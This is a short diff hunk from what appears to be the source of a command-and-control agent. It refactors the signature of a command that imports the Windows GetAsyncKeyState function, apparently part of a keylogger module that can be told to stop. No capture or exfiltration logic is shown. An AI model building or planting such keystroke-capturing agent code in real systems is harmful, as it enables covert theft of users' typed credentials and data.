@@ -28,7 +28,7 @@ namespace Agent.Commands
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
-        public override void InnerExecute(AgentTask task, Agent.Models.Agent agent, AgentTaskResult result, CommModule commm)
+        public override void InnerExecute(AgentTask task, Agent.Models.Agent agent, AgentTaskResult result, MessageManager commm)
         {
             if (task.SplittedArgs.Length > 0 && task.SplittedArgs[0] == "stop")
             {
